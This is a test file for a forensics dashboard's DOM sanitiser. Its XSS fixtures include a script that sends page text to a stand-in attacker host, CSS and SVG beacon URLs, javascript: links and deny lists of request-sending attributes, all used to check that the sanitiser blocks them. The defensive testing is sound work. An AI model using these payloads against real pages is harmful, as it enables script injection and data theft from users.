import { readFileSync } from "node:fs";
import { readFile } from "node:fs/promises";
import { runInNewContext } from "node:vm";
import { describe, expect, it } from "vitest";

interface AttributeVerdict {
  name: string;
  value: string;
}

interface SafeDomApi {
  attributeAction(
    tagName: string,
    isSvg: boolean,
    name: string,
    value: string,
    fromScript?: boolean,
  ): AttributeVerdict | null;
  isSafeUrl(value: string, attribute: string, tagName: string): boolean;
  sanitizeCssText(value: string): string;
  precleanHtml(value: string): string;
}

const ORIGIN = "https://companion.example.com";

async function loadApi(withOrigin = false): Promise<SafeDomApi> {
  const source = await readFile(new URL("../../../public/js/safe-dom.js", import.meta.url), "utf8");
  const context: { DFIRSafeDOM?: SafeDomApi; URL?: typeof URL; location?: { origin: string } } = withOrigin
    ? { URL, location: { origin: ORIGIN } }
    : {};
  runInNewContext(source, context);
  if (!context.DFIRSafeDOM) throw new Error("safe-dom.js did not publish its testable API");
  return context.DFIRSafeDOM;
}

// The dashboard's esc() (public/js/dashboard-escape.js, present.html, mobile.html).
function esc(value: string): string {
  const map: Record<string, string> = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" };
  return value.replace(/[&<>"']/g, (c) => map[c]);
}

// Evidence and analyst text that the old attribute regexes deleted or rewrote on screen (#1787).
const MANGLED_EVIDENCE = [
  "<img src=x onerror=alert(2)> | pipe |",
  'powershell.exe -c "Start-Process x" onload=1',
  'cmdline: mshta.exe vbscript:Execute onclick="x"',
  "wmic process call create \"c:\\x.exe\" onerror='y'",
  "user typed: srcdoc=foo bar",
  "benign text with only=equals",
  "one=1 online=yes OneDrive=C:\\Users\\a\\OneDrive",
  'schtasks /create /tn x /tr "cmd /c evil" style=color:red',
  'note  STYLE = "background:url(https://example.com/x)" and ONLOAD = go',
];

// Raw markup an attacker can plant in an artifact name, command line or report field.
const RAW_XSS_FIXTURES = [
  '<img src=x onerror="alert(document.cookie)">',
  "<IMG SRC=x ONERROR=alert(1)>",
  '<script>fetch("https://attacker.invalid/"+document.body.innerText)</script>',
  '<svg><a href="javascript:alert(1)">artifact</a></svg>',
  '<svg onload="alert(1)"><rect onpointerenter="alert(2)"/></svg>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<div style="background:url(https://attacker.invalid/leak)">report field</div>',
  '<form action="https://attacker.invalid"><button formaction="javascript:alert(1)">x</button></form>',
];

// Test-only attribute reader for the fixtures above. The browser's parser is what the product uses.
function tagsOf(html: string): { tag: string; isSvg: boolean; attrs: [string, string][] }[] {
  const out: { tag: string; isSvg: boolean; attrs: [string, string][] }[] = [];
  let inSvg = false;
  for (const m of html.matchAll(/<(\/?)([a-z][a-z0-9]*)([^>]*)>/gi)) {
    const tag = m[2].toUpperCase();
    if (tag === "SVG") inSvg = m[1] !== "/";
    if (m[1] === "/") continue;
    const attrs: [string, string][] = [];
    for (const a of m[3].matchAll(/([^\s"'>\/=]+)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+)))?/g)) {
      attrs.push([a[1], a[2] ?? a[3] ?? a[4] ?? ""]);
    }
    out.push({ tag, isSvg: inSvg || tag === "SVG", attrs });
  }
  return out;
}

describe("safe DOM policy — evidence text is never rewritten (#1787)", () => {
  it("leaves escaped evidence text byte-identical", async () => {
    const api = await loadApi();
    for (const text of MANGLED_EVIDENCE) {
      const html = `<td class="cell">${esc(text)}</td>`;
      expect(api.precleanHtml(html), text).toBe(html);
    }
  });

  it("leaves escaped evidence inside attribute values (tooltips) byte-identical", async () => {
    const api = await loadApi();
    for (const text of MANGLED_EVIDENCE) {
      const html = `<span title="${esc(text)}" data-cmd='${esc(text)}'>${esc(text)}</span>`;
      expect(api.precleanHtml(html), text).toBe(html);
    }
  });

  it("keeps an escaped tooltip value when the DOM walk judges the attribute", async () => {
    const api = await loadApi();
    for (const text of MANGLED_EVIDENCE) {
      expect(api.attributeAction("SPAN", false, "title", text)).toEqual({ name: "title", value: text });
    }
  });
});

describe("safe DOM policy — adversarial evidence fixtures", () => {
  it("strips blocked elements before the parser sees them", async () => {
    const api = await loadApi();
    for (const fixture of RAW_XSS_FIXTURES) {
      expect(api.precleanHtml(fixture).toLowerCase(), fixture).not.toMatch(/<script|<iframe/);
    }
  });

  it("drops or neutralizes every executable attribute in the raw fixtures", async () => {
    const api = await loadApi();
    for (const fixture of RAW_XSS_FIXTURES) {
      for (const { tag, isSvg, attrs } of tagsOf(api.precleanHtml(fixture))) {
        for (const [name, value] of attrs) {
          const verdict = api.attributeAction(tag, isSvg, name, value);
          if (!verdict) continue;
          const kept = `${verdict.name}=${verdict.value}`.toLowerCase();
          expect(kept, `${fixture} → ${name}`).not.toMatch(
            /^on|^srcdoc|^style=|^action|^formaction|javascript:|url\(/,
          );
        }
      }
    }
  });

  it("drops handler, srcdoc and form-target attributes in any case and namespace", async () => {
    const api = await loadApi();
    for (const name of [
      "onerror",
      "ONERROR",
      "OnLoad",
      "onpointerenter",
      "srcdoc",
      "SRCDOC",
      "action",
      "formaction",
      "srcset",
    ]) {
      expect(api.attributeAction("IMG", false, name, "alert(1)"), name).toBeNull();
      expect(api.attributeAction("RECT", true, name, "alert(1)"), name).toBeNull();
    }
    expect(api.attributeAction("A", false, "href", "javascript:alert(1)")).toBeNull();
    expect(api.attributeAction("A", false, "HREF", " jav\tascript:alert(1)")).toBeNull();
    expect(api.attributeAction("A", true, "href", "https://example.com/")).toBeNull();
  });

  it("turns style into sanitized data-safe-style and drops network CSS", async () => {
    const api = await loadApi();
    expect(api.attributeAction("DIV", false, "style", "color:red")).toEqual({
      name: "data-safe-style",
      value: "color:red",
    });
    expect(
      api.attributeAction("DIV", false, "STYLE", "background:url(https://attacker.invalid/x)"),
    ).toBeNull();
    expect(api.attributeAction("DIV", false, "data-safe-style", "width:expression(alert(1))")).toBeNull();
    expect(api.attributeAction("svg", true, "viewBox", "0 0 10 10")).toEqual({
      name: "viewBox",
      value: "0 0 10 10",
    });
  });

  it("rejects scriptable URLs but retains ordinary evidence and same-origin links", async () => {
    const api = await loadApi();
    expect(api.isSafeUrl("javascript:alert(1)", "href", "a")).toBe(false);
    expect(api.isSafeUrl("data:text/html,<script>alert(1)</script>", "href", "a")).toBe(false);
    expect(api.isSafeUrl("//attacker.invalid/leak", "src", "img")).toBe(false);
    expect(api.isSafeUrl("/cases/demo/evidence/screenshot.png", "src", "img")).toBe(true);
    expect(api.isSafeUrl("/sw.js", "src", "script")).toBe(true);
    expect(api.isSafeUrl("javascript:alert(1)", "src", "script")).toBe(false);
    expect(api.isSafeUrl("https://example.invalid/advisory", "href", "a")).toBe(true);
  });

  it("allows presentation CSS but drops CSS execution and network primitives", async () => {
    const api = await loadApi();
    expect(api.sanitizeCssText("display:none;color:var(--text-muted);width:42%")).toBe(
      "display:none;color:var(--text-muted);width:42%",
    );
    expect(api.sanitizeCssText("background:url(https://attacker.invalid/x);color:red")).toBe("color:red");
    expect(api.sanitizeCssText("width:expression(alert(1));position:fixed")).toBe("position:fixed");
  });
});

describe("safe DOM policy — CSS image functions fetch URLs too (#1811)", () => {
  it("drops image-set(), -webkit-image-set(), image(), src() and a nested cross-fade(image())", async () => {
    const api = await loadApi();
    for (const decl of [
      'background-image:image-set("https://attacker.invalid/a" 1x)',
      "background-image:-webkit-image-set('https://attacker.invalid/a' 1x)",
      'background:IMAGE-SET("https://attacker.invalid/a" 1x)',
      'list-style-image:image("https://attacker.invalid/a")',
      'background:cross-fade(image("https://attacker.invalid/a"),red)',
      'background-image:src("https://attacker.invalid/a")',
      "--leak:image-set('https://attacker.invalid/a' 1x)",
    ]) {
      expect(api.sanitizeCssText(`${decl};color:red`), decl).toBe("color:red");
    }
  });

  it("keeps gradients and image-named properties that fetch nothing", async () => {
    const api = await loadApi();
    const css = "background-image:linear-gradient(red,blue);border-image-width:2px;image-rendering:pixelated";
    expect(api.sanitizeCssText(css)).toBe(css);
  });
});

describe("safe DOM policy — backslash URLs are another origin (#1812)", () => {
  const OFF_ORIGIN = [
    "/\\attacker.invalid/x",
    "\\\\attacker.invalid/x",
    "\\/attacker.invalid/x",
    "/\t\\attacker.invalid/x",
    " \\attacker.invalid/x",
    "\\attacker.invalid/x",
  ];

  it("rejects a leading backslash in any mix with a slash", async () => {
    const api = await loadApi();
    for (const url of OFF_ORIGIN) {
      expect(api.isSafeUrl(url, "src", "img"), JSON.stringify(url)).toBe(false);
      expect(api.isSafeUrl(url, "href", "a"), JSON.stringify(url)).toBe(false);
      expect(api.isSafeUrl(url, "src", "script"), JSON.stringify(url)).toBe(false);
    }
  });

  it("still keeps same-origin paths and relative links", async () => {
    const api = await loadApi();
    for (const url of ["/cases/demo/x.png", "./x.png", "../x.png", "?q=1", "#top"]) {
      expect(api.isSafeUrl(url, "src", "img"), url).toBe(true);
    }
  });

  it("allows an external href only on an anchor", async () => {
    const api = await loadApi();
    expect(api.isSafeUrl("https://example.com/advisory", "href", "a")).toBe(true);
    expect(api.isSafeUrl("https://example.com/x.css", "href", "link")).toBe(false);
    expect(api.isSafeUrl("https://example.com/", "href", "base")).toBe(false);
    expect(api.isSafeUrl("https://example.com/x.svg#a", "href", "use")).toBe(false);
  });
});

// A minimal DOM, just enough for safe-dom.js to patch Element.prototype, so the setters can be
// driven without a browser. The Chromium/Firefox spec proves the same against a real parser.
function loadPatchedElement(): { make(tag: string, svg?: boolean): FakeElement } {
  const source = readFileSync(new URL("../../../public/js/safe-dom.js", import.meta.url), "utf8");
  class Element {
    attrs = new Map<string, string>();
    tagName = "DIV";
    namespaceURI = "http://www.w3.org/1999/xhtml";
    get innerHTML(): string {
      return "";
    }
    set innerHTML(_v: string) {}
    get outerHTML(): string {
      return "";
    }
    set outerHTML(_v: string) {}
    insertAdjacentHTML(): void {}
    setAttribute(name: string, value: unknown): void {
      this.attrs.set(name, String(value));
    }
    setAttributeNS(_ns: string | null, name: string, value: unknown): void {
      this.attrs.set(name, String(value));
    }
    removeAttribute(name: string): void {
      this.attrs.delete(name);
    }
  }
  const document = {
    readyState: "complete",
    documentElement: { classList: { add() {} } },
    querySelectorAll: () => [],
  };
  // Reflecting IDL properties, as the browser defines them: an accessor on the interface
  // prototype that writes the content attribute.
  const reflecting: Record<string, [string, string][]> = {
    HTMLAnchorElement: [
      ["href", "href"],
      ["ping", "ping"],
    ],
    HTMLAreaElement: [["href", "href"]],
    HTMLLinkElement: [
      ["href", "href"],
      ["imageSrcset", "imagesrcset"],
    ],
    HTMLBaseElement: [["href", "href"]],
    HTMLFormElement: [["action", "action"]],
    HTMLButtonElement: [["formAction", "formaction"]],
    HTMLInputElement: [
      ["formAction", "formaction"],
      ["src", "src"],
    ],
    HTMLImageElement: [
      ["src", "src"],
      ["srcset", "srcset"],
    ],
    HTMLSourceElement: [
      ["src", "src"],
      ["srcset", "srcset"],
    ],
    HTMLIFrameElement: [
      ["src", "src"],
      ["srcdoc", "srcdoc"],
    ],
    HTMLObjectElement: [["data", "data"]],
    HTMLEmbedElement: [["src", "src"]],
    HTMLMediaElement: [["src", "src"]],
    HTMLScriptElement: [["src", "src"]],
    HTMLMetaElement: [["httpEquiv", "http-equiv"]],
  };
  const context = { Element, document, URL, location: { origin: ORIGIN } } as Record<string, unknown>;
  for (const [iface, props] of Object.entries(reflecting)) {
    const cls = class extends Element {};
    for (const [prop, attr] of props) {
      Object.defineProperty(cls.prototype, prop, {
        configurable: true,
        enumerable: true,
        get(this: Element) {
          return this.attrs.get(attr) ?? "";
        },
        set(this: Element, value: unknown) {
          this.attrs.set(attr, String(value));
        },
      });
    }
    context[iface] = cls;
  }
  const byTag: Record<string, string> = {
    A: "HTMLAnchorElement",
    AREA: "HTMLAreaElement",
    LINK: "HTMLLinkElement",
    BASE: "HTMLBaseElement",
    FORM: "HTMLFormElement",
    BUTTON: "HTMLButtonElement",
    INPUT: "HTMLInputElement",
    IMG: "HTMLImageElement",
    SOURCE: "HTMLSourceElement",
    IFRAME: "HTMLIFrameElement",
    OBJECT: "HTMLObjectElement",
    EMBED: "HTMLEmbedElement",
    VIDEO: "HTMLMediaElement",
    SCRIPT: "HTMLScriptElement",
    META: "HTMLMetaElement",
  };
  runInNewContext(source, context);
  return {
    make(tag, svg = false) {
      const cls = (
        !svg && byTag[tag.toUpperCase()] ? context[byTag[tag.toUpperCase()]] : Element
      ) as typeof Element;
      const el = new cls() as unknown as FakeElement;
      el.tagName = svg ? tag.toLowerCase() : tag.toUpperCase();
      el.namespaceURI = svg ? "http://www.w3.org/2000/svg" : "http://www.w3.org/1999/xhtml";
      return el;
    },
  };
}

interface FakeElement {
  [property: string]: unknown;
  attrs: Map<string, string>;
  tagName: string;
  namespaceURI: string;
  setAttribute(name: unknown, value: unknown): void;
  setAttributeNS(ns: string | null, name: unknown, value: unknown): void;
}

describe("safe DOM policy — script setters share the markup deny rules (#1813)", () => {
  const XLINK = "http://www.w3.org/1999/xlink";

  it("drops action, formaction, srcset, ping, background, srcdoc and handlers via setAttribute", () => {
    const dom = loadPatchedElement();
    for (const [tag, name, value] of [
      ["FORM", "action", "https://attacker.invalid/"],
      ["BUTTON", "formaction", "javascript:alert(1)"],
      ["IMG", "srcset", "https://attacker.invalid/x 1x"],
      ["A", "ping", "https://attacker.invalid/"],
      ["TABLE", "background", "https://attacker.invalid/x"],
      ["IFRAME", "srcdoc", "<script>alert(1)</script>"],
      ["IMG", "OnError", "alert(1)"],
      ["A", "href", "javascript:alert(1)"],
      ["IMG", "src", "/\\attacker.invalid/x"],
      ["LINK", "href", "https://attacker.invalid/x.css"],
    ]) {
      const el = dom.make(tag);
      el.setAttribute(name, value);
      expect([...el.attrs.keys()], `${tag} ${name}`).toEqual([]);
    }
  });

  it("drops the same attributes via setAttributeNS, judging XLink href by namespace not prefix", () => {
    const dom = loadPatchedElement();
    const a = dom.make("a", true);
    a.setAttributeNS(XLINK, "evil:href", "javascript:alert(1)");
    a.setAttributeNS(null, "formaction", "https://attacker.invalid/");
    a.setAttributeNS(null, "onclick", "alert(1)");
    expect([...a.attrs.keys()]).toEqual([]);
    const use = dom.make("use", true);
    use.setAttributeNS(XLINK, "xlink:href", "https://attacker.invalid/x.svg#a");
    use.setAttributeNS("http://www.w3.org/XML/1998/namespace", "xml:base", "https://attacker.invalid/");
    expect([...use.attrs.keys()]).toEqual([]);
  });

  it("drops a remote SVG paint or clip reference but keeps a local one", () => {
    const dom = loadPatchedElement();
    const rect = dom.make("rect", true);
    rect.setAttribute("fill", "url(https://attacker.invalid/p.svg#g)");
    rect.setAttribute("clip-path", "url( 'https://attacker.invalid/c.svg#c')");
    expect([...rect.attrs.keys()]).toEqual([]);
    rect.setAttribute("cursor", "\\75rl(https://attacker.invalid/c.png), auto");
    rect.setAttribute("fill", "\\000075rl(https://attacker.invalid/p.svg#g)");
    rect.setAttribute("stroke", "image-set('https://attacker.invalid/s' 1x)");
    expect([...rect.attrs.keys()]).toEqual([]);
    rect.setAttribute("fill", "url(#grad)");
    rect.setAttribute("data-tip", "C:\\Windows\\Temp\\x.ps1");
    expect(rect.attrs.get("fill")).toBe("url(#grad)");
    expect(rect.attrs.get("data-tip")).toBe("C:\\Windows\\Temp\\x.ps1");
  });

  it("keeps the attributes app code and Leaflet set, with the caller's value", () => {
    const dom = loadPatchedElement();
    const path = dom.make("path", true);
    for (const [name, value] of [
      ["fill-rule", "evenodd"],
      ["pointer-events", "none"],
      ["stroke-dashoffset", "2"],
      ["d", "M0 0L1 1"],
      ["data-tip", "powershell -c onload=1"],
    ]) {
      path.setAttribute(name, value);
      expect(path.attrs.get(name), name).toBe(value);
    }
    const img = dom.make("IMG");
    img.setAttribute("src", "/cases/demo/x.png");
    img.setAttribute("aria-valuenow", null);
    expect(img.attrs.get("src")).toBe("/cases/demo/x.png");
    expect(img.attrs.get("aria-valuenow")).toBe("null");
  });

  it("drops a CSS-escaped remote reference in SVG markup too", async () => {
    const api = await loadApi();
    expect(api.attributeAction("RECT", true, "fill", "\\75rl(https://attacker.invalid/p)")).toBeNull();
    expect(api.attributeAction("RECT", true, "clip-path", "url(https://attacker.invalid/c#c)")).toBeNull();
    expect(api.attributeAction("RECT", true, "fill", "url(#grad)")).toEqual({
      name: "fill",
      value: "url(#grad)",
    });
  });

  it("markup and script paths agree on every denied attribute", async () => {
    const api = await loadApi();
    for (const name of ["action", "formaction", "srcset", "ping", "background", "srcdoc", "onclick"]) {
      expect(api.attributeAction("A", false, name, "x"), name).toBeNull();
      expect(api.attributeAction("A", false, name, "x", true), name).toBeNull();
    }
  });
});

describe("safe DOM policy — property setters share the script rule (#1858)", () => {
  const DENIED: [string, string, string][] = [
    ["A", "href", "javascript:window.__xss=1"],
    ["A", "href", " jav\tascript:alert(1)"],
    ["A", "ping", "https://attacker.invalid/"],
    ["AREA", "href", "javascript:alert(1)"],
    ["LINK", "href", "https://attacker.invalid/x.css"],
    ["LINK", "imageSrcset", "https://attacker.invalid/x 1x"],
    ["BASE", "href", "https://attacker.invalid/"],
    ["FORM", "action", "https://attacker.invalid/"],
    ["BUTTON", "formAction", "javascript:alert(1)"],
    ["INPUT", "formAction", "/same-origin/is/still/denied"],
    ["INPUT", "src", "https://attacker.invalid/i.png"],
    ["IMG", "src", "javascript:alert(1)"],
    ["IMG", "src", "https://attacker.invalid/pixel.png"],
    ["IMG", "src", "/\\attacker.invalid/x"],
    ["IMG", "srcset", "/x.png 1x"],
    ["SOURCE", "srcset", "https://attacker.invalid/x 1x"],
    ["SOURCE", "src", "https://attacker.invalid/x.mp4"],
    ["IFRAME", "src", "javascript:alert(1)"],
    ["IFRAME", "srcdoc", "<script>alert(1)</script>"],
    ["OBJECT", "data", "javascript:alert(1)"],
    ["OBJECT", "data", "https://attacker.invalid/x.html"],
    ["EMBED", "src", "https://attacker.invalid/x.swf"],
    ["VIDEO", "src", "https://attacker.invalid/x.mp4"],
    ["SCRIPT", "src", "https://attacker.invalid/x.js"],
    ["META", "httpEquiv", "refresh"],
    ["A", "href", `blob:https://attacker.invalid/0b6c6f2a-1e1d-4c1b-9d3e-3f8a2c1d5e7f`],
    ["A", "href", "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="],
    ["IMG", "src", "data:text/html,<script>alert(1)</script>"],
  ];

  it("drops every denied value and leaves the attribute untouched", () => {
    const dom = loadPatchedElement();
    for (const [tag, prop, value] of DENIED) {
      const el = dom.make(tag);
      el[prop] = value;
      expect([...el.attrs.entries()], `${tag}.${prop} = ${value}`).toEqual([]);
    }
  });

  it("keeps the previous value when a later write is denied", () => {
    const dom = loadPatchedElement();
    const a = dom.make("A");
    a.href = "/cases/demo/report.html";
    a.href = "javascript:alert(1)";
    expect(a.href).toBe("/cases/demo/report.html");
  });

  // Every property write the app and its vendored libraries make today (PLAN-1858 inventory).
  const LEGITIMATE: [string, string, string][] = [
    ["A", "href", "/auth/oidc/start?returnTo=%2Fdashboard"],
    ["A", "href", "/cases/demo/custody/manifest"],
    ["A", "href", `blob:${ORIGIN}/0b6c6f2a-1e1d-4c1b-9d3e-3f8a2c1d5e7f`],
    [
      "A",
      "href",
      "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==",
    ],
    ["A", "href", "#"],
    ["A", "href", "#close"],
    ["A", "href", "https://example.com/advisory"],
    ["IMG", "src", "data:image/jpeg;base64,/9j/4AAQSkZJRg=="],
    ["IMG", "src", "data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs="],
    [
      "IMG",
      "src",
      "data:image/svg+xml;utf8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%2F%3E",
    ],
    ["IMG", "src", "/geo-tiles/3/4/2.png"],
    ["IMG", "src", `${ORIGIN}/vendor/leaflet/images/marker-icon.png`],
    ["IMG", "src", ""],
  ];

  it("keeps every write the app makes today, with the caller's value", () => {
    const dom = loadPatchedElement();
    for (const [tag, prop, value] of LEGITIMATE) {
      const el = dom.make(tag);
      el[prop] = value;
      expect(el[prop], `${tag}.${prop} = ${value.slice(0, 60)}`).toBe(value);
    }
  });

  it("judges and writes one value when toString changes between calls", () => {
    const dom = loadPatchedElement();
    const shifty = (first: string, then: string) => {
      let calls = 0;
      return { toString: () => (calls++ === 0 ? first : then) };
    };
    const a = dom.make("A");
    a.href = shifty("/safe", "javascript:alert(1)");
    expect(a.attrs.get("href")).toBe("/safe");
    const b = dom.make("A");
    b.setAttribute("href", shifty("/safe", "javascript:alert(1)"));
    expect(b.attrs.get("href")).toBe("/safe");
    const c = dom.make("A");
    c.setAttribute(shifty("title", "onclick"), "alert(1)");
    expect([...c.attrs.keys()]).toEqual(["title"]);
    const d = dom.make("a", true);
    d.setAttributeNS(null, shifty("title", "onclick"), "alert(1)");
    expect([...d.attrs.keys()]).toEqual(["title"]);
  });
});

describe("safe DOM policy — URL rules for downloads and graph glyphs (#1858)", () => {
  it("allows a same-origin blob download link and refuses one from another origin", async () => {
    const api = await loadApi(true);
    expect(api.isSafeUrl(`blob:${ORIGIN}/0b6c6f2a-1e1d`, "href", "a")).toBe(true);
    expect(api.isSafeUrl(`blob:${ORIGIN}/0b6c6f2a-1e1d`, "href", "area")).toBe(true);
    expect(api.isSafeUrl("blob:https://attacker.invalid/0b6c6f2a", "href", "a")).toBe(false);
    expect(api.isSafeUrl(`blob:${ORIGIN}/0b6c6f2a-1e1d`, "href", "link")).toBe(false);
    expect(api.isSafeUrl(`blob:${ORIGIN}/0b6c6f2a-1e1d`, "src", "iframe")).toBe(false);
  });

  it("parses a blob link on an opaque-origin page without throwing", async () => {
    const source = await readFile(new URL("../../../public/js/safe-dom.js", import.meta.url), "utf8");
    const context: { DFIRSafeDOM?: SafeDomApi } & Record<string, unknown> = {
      URL,
      location: { origin: "null" },
    };
    runInNewContext(source, context);
    expect(context.DFIRSafeDOM!.isSafeUrl("blob:null/0b6c6f2a-1e1d", "href", "a")).toBe(true);
    expect(context.DFIRSafeDOM!.isSafeUrl(`blob:${ORIGIN}/0b6c6f2a-1e1d`, "href", "a")).toBe(false);
  });

  it("allows a raster data-image download link but no other data URL on an anchor", async () => {
    const api = await loadApi(true);
    expect(api.isSafeUrl("data:image/png;base64,iVBORw0KGgo=", "href", "a")).toBe(true);
    expect(api.isSafeUrl("data:image/svg+xml,<svg onload=alert(1)>", "href", "a")).toBe(false);
    expect(api.isSafeUrl("data:text/html,<script>alert(1)</script>", "href", "a")).toBe(false);
    expect(api.isSafeUrl("data:image/png;base64,iVBORw0KGgo=", "href", "link")).toBe(false);
  });

  it("allows an SVG data URI only as an image source", async () => {
    const api = await loadApi(true);
    const glyph = "data:image/svg+xml;utf8,%3Csvg%2F%3E";
    expect(api.isSafeUrl(glyph, "src", "img")).toBe(true);
    expect(api.isSafeUrl("data:image/svg+xml;base64,PHN2Zy8+", "src", "img")).toBe(true);
    expect(api.isSafeUrl(glyph, "src", "iframe")).toBe(false);
    expect(api.isSafeUrl(glyph, "src", "embed")).toBe(false);
    expect(api.isSafeUrl(glyph, "href", "use")).toBe(false);
    expect(api.attributeAction("IMG", false, "src", glyph)).toEqual({ name: "src", value: glyph });
  });

  it("treats OBJECT data as a URL and denies request-sending attributes on both paths", async () => {
    const api = await loadApi(true);
    expect(api.attributeAction("OBJECT", false, "data", "javascript:alert(1)", true)).toBeNull();
    for (const name of [
      "imagesrcset",
      "attributionsrc",
      "lowsrc",
      "codebase",
      "archive",
      "code",
      "http-equiv",
      "xml:base",
    ]) {
      expect(api.attributeAction("LINK", false, name, "https://attacker.invalid/", true), name).toBeNull();
      expect(api.attributeAction("META", false, name, "refresh"), name).toBeNull();
    }
  });
});

describe("browser documents — governed rendering only", () => {
  const browserFiles = [
    "../../../public/dashboard.html",
    "../../../public/mobile.html",
    "../../../public/present.html",
    "../../../public/login.html",
    "../../../public/admin.html",
  ];

  it("loads the sink guard before application rendering code", async () => {
    for (const path of browserFiles) {
      const html = await readFile(new URL(path, import.meta.url), "utf8");
      const guard = html.indexOf('src="/js/safe-dom.js"');
      expect(guard, path).toBeGreaterThan(0);
      expect(guard, path).toBeLessThan(html.indexOf("<body"));
    }
  });

  it("contains no inline style or inline event-handler attributes", async () => {
    for (const path of browserFiles) {
      const html = await readFile(new URL(path, import.meta.url), "utf8");
      expect(
        [...html.matchAll(/\sstyle\s*=\s*["']/gi)].map((m) => m[0]),
        path,
      ).toEqual([]);
      expect(
        [...html.matchAll(/\son[a-z]+\s*=\s*["']/gi)].map((m) => m[0]),
        path,
      ).toEqual([]);
    }
  });

  it("nonces every inline script and stylesheet", async () => {
    for (const path of browserFiles) {
      const html = await readFile(new URL(path, import.meta.url), "utf8");
      const inlineScripts = [...html.matchAll(/<script(?![^>]*\ssrc=)[^>]*>/g)].map((m) => m[0]);
      const styles = [...html.matchAll(/<style[^>]*>/g)].map((m) => m[0]);
      for (const opener of [...inlineScripts, ...styles]) {
        expect(opener, `${path}: ${opener}`).toContain('nonce="__CSP_NONCE__"');
      }
    }
  });
});
